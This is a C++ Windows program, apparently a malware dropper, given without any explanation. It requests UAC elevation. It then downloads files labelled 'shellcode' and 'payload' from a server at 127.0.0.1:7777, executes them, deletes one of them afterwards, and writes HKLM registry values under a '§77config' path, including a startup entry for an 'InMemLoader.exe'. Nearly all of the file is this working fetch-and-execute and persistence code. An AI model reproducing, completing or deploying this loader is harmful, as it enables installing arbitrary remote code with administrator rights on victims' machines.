#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <fstream>
#include <shlobj.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "wininet.lib")

std::wstring GetCurrentExePath() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    std::wstring exePath(buffer);
    return exePath.substr(0, exePath.find_last_of(L"\\"));
}

std::wstring GetAppDataPath() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path))) {
        return std::wstring(path);
    }
    return L"";
}

bool IsUserAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminsGroup)) {
        CheckTokenMembership(NULL, adminsGroup, &isAdmin);
        FreeSid(adminsGroup);
    }
    return isAdmin;
}

void RequestUAC() {
    if (!IsUserAdmin()) {
        wchar_t exePath[MAX_PATH];
        if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
            std::wcerr << L"Failed to get executable path!" << std::endl;
            exit(1);
        }

        // Add an argument to continue execution in elevated mode
        HINSTANCE result = ShellExecute(NULL, L"runas", exePath, L"--elevated", NULL, SW_SHOWNORMAL);
        if ((INT_PTR)result <= 32) {
            std::wcerr << L"Failed to request UAC elevation. Error: " << (INT_PTR)result << std::endl;
        }
        exit(0); // exit original process
    }
}


bool DownloadFile(const std::wstring& url, const std::wstring& filePath) {
    HINTERNET hInternet = InternetOpen(L"MyDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }

    HANDLE hFile = CreateFile(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[1024];
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD written;
        if (!WriteFile(hFile, buffer, bytesRead, &written, NULL)) {
            std::wcerr << L"WriteFile failed. Error: " << GetLastError() << std::endl;
            break;
        }
        totalBytes += written;
    }

    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (totalBytes == 0) {
        std::wcerr << L"No data was downloaded from: " << url << std::endl;
        DeleteFileW(filePath.c_str()); // delete empty file
        return false;
    }

    return true;
}


void ExecuteFile(const std::wstring& filePath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcess(filePath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::wcerr << L"Failed to execute: " << filePath << std::endl;
    }
}

void DeleteLocalFile(const std::wstring& filePath) {
    if (!DeleteFileW(filePath.c_str())) {
        std::wcerr << L"Could not delete file: " << filePath << std::endl;
    }
}

bool CreateRegistryKeyValue(const std::wstring& keyPath, const std::wstring& name, const std::wstring& value) {
    HKEY hKey;
    LONG res = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL);
    if (res != ERROR_SUCCESS) {
        std::wcerr << L"Failed to create/open registry key: " << keyPath << std::endl;
        return false;
    }

    res = RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (const BYTE*)value.c_str(), (value.length() + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    return res == ERROR_SUCCESS;
}

bool RegistryKeyExists(const std::wstring& keyPath) {
    HKEY hKey;
    LONG res = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_READ, &hKey);
    if (res == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

void InstallFinalExecutable() {
    std::wstring url = L"http://127.0.0.1:7777/payload";
    std::wstring path = GetAppDataPath() + L"\\InMemLoader.exe";

    if (DownloadFile(url, path)) {
        ExecuteFile(path);
    }
    else {
        std::wcerr << L"Failed to download InMemLoader.exe" << std::endl;
    }
}

int wmain(int argc, wchar_t* argv[]) {
    bool elevated = false;
    for (int i = 0; i < argc; ++i) {
        if (wcscmp(argv[i], L"--elevated") == 0) {
            elevated = true;
            break;
        }
    }

    if (!elevated) {
        std::wcout << L"Requesting UAC..." << std::endl;
        RequestUAC();
        return 0;
    }

    std::wcout << L"Running with elevated privileges." << std::endl;

    std::wstring exeUrl = L"http://127.0.0.1:7777/shellcode";
    std::wstring exePath = GetCurrentExePath() + L"\\install.exe";

    std::wcout << L"Downloading main executable..." << std::endl;
    if (DownloadFile(exeUrl, exePath)) {
        std::wcout << L"Download successful: " << exePath << std::endl;
        ExecuteFile(exePath);
        DeleteLocalFile(exePath);
    }
    else {
        std::wcerr << L"Failed to download shellcode from: " << exeUrl << std::endl;
    }

    std::wstring regBase = L"SOFTWARE\\§77config\\paths";
    CreateRegistryKeyValue(regBase, L"STDR", exePath);
    CreateRegistryKeyValue(regBase, L"MRST", exePath + L"\\info.txt");

    std::wstring startupKey = L"SOFTWARE\\§77config\\startup";
    std::wstring loaderPath = GetAppDataPath() + L"\\InMemLoader.exe";
    CreateRegistryKeyValue(startupKey, L"FinalExecutablePath", loaderPath);

    std::wcout << L"Downloading final executable..." << std::endl;
    InstallFinalExecutable();

    return 0;
}

